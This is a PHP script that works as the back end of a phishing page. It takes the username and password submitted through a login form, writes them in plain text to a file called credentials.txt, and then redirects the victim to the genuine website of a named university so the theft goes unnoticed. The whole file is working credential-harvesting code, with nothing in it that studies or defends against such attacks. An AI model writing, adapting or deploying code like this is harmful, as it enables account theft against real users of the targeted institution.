<?php
// Turn on output buffering to prevent "headers already sent" issues
ob_start(); // Start output buffering

// Get the username and password from the form submission
$username = $_POST['username'];
$password = $_POST['password'];

// Prepare the data to write to a file
$log_data = "Username: " . $username . " | Password: " . $password . "\n";

// Specify the file where the data will be saved (e.g., credentials.txt)
$file = 'credentials.txt';

// Open the file in append mode
$handle = fopen($file, 'a');

// Write the data to the file
if ($handle) {
    fwrite($handle, $log_data);
    fclose($handle);
} else {
    // In case of failure to write to file, stop execution
    echo json_encode(array("success" => false, "message" => "Failed to write to file"));
    exit(); 
}

// Redirect the user to https://lnmiit.ac.in/ after logging credentials
header("Location: https://lnmiit.ac.in/");
exit(); // Stop further execution after redirection

// End output buffering and clean output
ob_end_flush(); 
?>
